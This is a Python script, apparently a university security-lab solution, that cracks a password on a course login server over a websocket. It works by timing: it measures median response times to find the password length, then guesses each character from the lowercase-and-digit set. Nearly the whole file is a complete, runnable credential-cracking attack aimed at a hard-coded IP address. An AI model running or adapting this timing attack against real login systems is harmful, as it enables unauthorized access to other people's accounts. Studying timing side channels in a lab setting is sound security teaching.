import asyncio
import websockets
import time
import string
import statistics
from json import dumps, loads
from time import sleep

# --- SERVER CONNECTION LOGIC (From client.py) ---

async def client_connect(username, password, variance=0.001):
    """Handles sending and receiving logins to & from the server[cite: 28]."""
    server_address = "ws://20.224.193.77:8080"
    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                await websocket.send(dumps([username, password, variance]))
                reply = await websocket.recv()
                return loads(reply)
        except Exception:
            await asyncio.sleep(1)

def call_server(username, password):
    """Makes use of client_connect and can be called directly[cite: 29]."""
    reply = asyncio.run(client_connect(username, password))
    # Mandatory sleep to prevent server DDoS[cite: 33, 34].
    sleep(0.001) 
    return reply

# --- ATTACK LOGIC ---

# The password consists only of lowercase letters and digits[cite: 23, 52].
CHARSET = string.ascii_lowercase + string.digits 

def get_stable_time(student_number, password, samples=60):
    """
    Measures response time between sending credentials and receiving a response[cite: 41].
    Uses the median to filter out variable network delay.
    """
    times = []
    for _ in range(samples):
        start = time.perf_counter()
        call_server(student_number, password)
        end = time.perf_counter()
        times.append(end - start)
    return statistics.median(times)

def find_password_length(student_number):
    """
    Measures response times of passwords of different lengths to determine the correct one[cite: 44].
    """
    print("Step 1: Determining password length...")
    results = []
    
    # Testing lengths from 1 to 20[cite: 44].
    for length in range(1, 21):
        # We use a dummy string to test the length.
        test_pw = "a" * length
        t = get_stable_time(student_number, test_pw, samples=60)
        results.append((t, length))
        print(f"  Length {length:02}: {t:.5f}s")
    
    # The correct length results in the longest execution time[cite: 19].
    results.sort(reverse=True)
    best_length = results[0][1]
    print(f">> Detected Length: {best_length}\n")
    return best_length

def crack_password(student_number):
    """
    Cracks the password character by character[cite: 51].
    """
    # First, the script figures out the length by itself.
    length = find_password_length(student_number)
    current_pw = list("a" * length)
    
    print(f"Step 2: Cracking characters for {student_number}...")
    
    for i in range(length):
        char_results = []
        for char in CHARSET:
            current_pw[i] = char
            test_str = "".join(current_pw)
            t = get_stable_time(student_number, test_str, samples=60)
            char_results.append((t, char))
        
        # The character that causes the longest delay is correct[cite: 19].
        char_results.sort(reverse=True)
        best_char = char_results[0][1]
        
        current_pw[i] = best_char
        print(f"  Pos {i}: '{best_char}' -> Current: {''.join(current_pw)}")
    
    final_password = "".join(current_pw)
    print(f"\n[SUCCESS] Cracked Password: {final_password}")
    return final_password

if __name__ == "__main__":
    # Test with student 000000 (hunter2) or your own student ID[cite: 54].
    target_student = "000000" 
    crack_password(target_student)